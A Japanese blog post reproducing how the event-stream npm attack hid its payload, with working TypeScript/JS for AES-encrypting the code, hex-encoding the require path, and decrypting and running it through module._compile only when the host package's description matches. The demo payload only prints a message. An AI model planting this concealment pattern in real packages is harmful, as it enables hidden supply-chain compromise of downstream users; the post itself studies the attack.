# 概要

本記事は直近で起きた npm パッケージ event-stream への攻撃のうち、任意のコードを忍ばせる手法の追試です。

⚠️ 今回は攻撃者がパッケージのメンテナであったために発生したことであり、この記事を読んで誰でも攻撃できるようになるわけではありません。
⚠️ 念のためですが、悪用しないようにお願いします。

# コード

https://github.com/kik4/npm-evil-code-injection

# ポイント

今回の攻撃では minify したコードにのみ攻撃コードが挿入されていました。ただ minify しただけでなく、一見してそれとわからないようにコードが隠蔽されていました。その手法を実際にやってみます。
この記事で確かめる隠蔽手法は次の３つです。

1. 攻撃コードの暗号化
2. 攻撃実行コードの require パスの隠蔽
3. package.json の description を見て攻撃対象を限定

バージョン操作やパッケージの publish などは取り扱いません。

# 攻撃手順

今回題材とするコードは次の通りです。

```ts
// 正常なコード
export default () => console.log("This is good code.");
```

```ts
// 攻撃コード
console.log("This is evil code.");
```

上記の正常なコードに攻撃コードを忍ばせます。そしてこのパッケージを実行する npm パッケージの description が`run evil code`の時だけ攻撃コードが実行されるようにしていきます。

## 1. 攻撃コードの暗号化 & 3. description で攻撃対象を限定

まず攻撃コードを AES 暗号化します。暗号化は node コマンドで REPL を起動させてちゃっちゃとやってしまいます。
暗号化する文字列は攻撃コードである`console.log("This is evil code.")`ですね。
パスワードは description で起動させる`run evil code`です。次の項で書きますが復号化時に実行しているパッケージの description を拾って与えることで、攻撃対象を限定します。

```js
var code = 'console.log("This is evil code.")';
var password = "run evil code";
var cipher = require("crypto").createCipher("aes-256-cbc", password);
var encoded = cipher.update(code, "utf8", "hex") + cipher.final("hex");
encoded;
```

結果は`cfdc36e155f1213c266810ac757ceb743e036c6aa08703d564010029511c7af099387eb23604e1b308233f4eba23dd0f`です。無事に元の攻撃コードがわからなくなりました。

## 2. 攻撃実行コードの require パスの隠蔽

### index.ts

正常なコードを書いたファイルを index.ts。攻撃コードを忍ばせ、攻撃を実行するコードを書いたファイルを data.ts とします。
まずは index.ts から data.ts を require します。ただしトランスパイルされるので実際のファイル名は`./data.js`ですね。これの default の実行が攻撃コードの実行です。

```ts
export default () => {
  require("./data.js").default();
  console.log("This is good code.");
};
```

今回はこの require の中の文字列が hex エンコードされていました。なので`./data.js`もエンコードしましょう。
ここでも node でちゃっとやってしまいます。

```js
Buffer.from("./data.js").toString("hex");
// '2e2f646174612e6a73'
```

結果は`2e2f646174612e6a73`になりました。これを require の中にデコード処理を入れて書き換えます。

```ts
export default () => {
  require(Buffer.from("2e2f646174612e6a73", "hex").toString()).default();
  console.log("This is good code.");
};
```

一見して何のファイルが読み込まれているかわからなくなりましたね。

### data.ts

次に data.ts の用意です。この中で暗号化したコードの複合と実行を行います。
暗号化された攻撃コードは`cfdc36e155f1213c266810ac757ceb743e036c6aa08703d564010029511c7af099387eb23604e1b308233f4eba23dd0f`。
これを実行パッケージの package.json の description を格納している`process.env.npm_package_description`で復号し、それを実行してやります。

```ts
import * as crypto from "crypto";

// _compile()の定義が無かったので追加
declare global {
  interface NodeModule {
    _compile(arg1: string, arg2: string): any;
  }
}

export default () => {
  // 攻撃コード
  const data =
    "cfdc36e155f1213c266810ac757ceb743e036c6aa08703d564010029511c7af099387eb23604e1b308233f4eba23dd0f";
  // 復号器
  const decipher = crypto.createDecipher(
    "aes256",
    process.env.npm_package_description || ""
  );

  // パスワードが違うとこけるのでキャッチ
  try {
    // 復号
    const payload =
      decipher.update(data, "hex", "utf8") + decipher.final("utf8");
    // 実行
    module._compile(payload, "");
  } catch {}
};
```

以上で攻撃コードの仕込みは完了です。
一度 build して出力ディレクトリの dist を生成しておきます。これが実際に実行される js ファイルです。

# 攻撃を受けてみる

攻撃される側のパッケージを用意します。攻撃を仕込んだパッケージは公開してもしょうがないので今回はローカルインポートにしました。
package.json では攻撃コードが実行されるように description を`run evil code`にしておきます。

```json
{
  // 略
  "description": "run evil code",
  // 略
  "dependencies": {
    "library": "../library" // ローカルインポート
    // 略
  }
}
```

実行コードは素朴にこんな感じ。

```ts
import library from "library";
library();
```

これを実行した出力結果は以下の通りです。

```
// 期待する結果
// This is good code.

// 実際の結果
This is evil code.
This is good code.
```

無事に攻撃コードが実行されました！
description を書き換えると`This is evil code.`が出てきません。ちゃんと攻撃対象を絞れました。

# 参考

[2018/11/27 に判明した npm パッケージ乗っ取りについて](https://qiita.com/azs/items/b15bc456bee3a7892950)
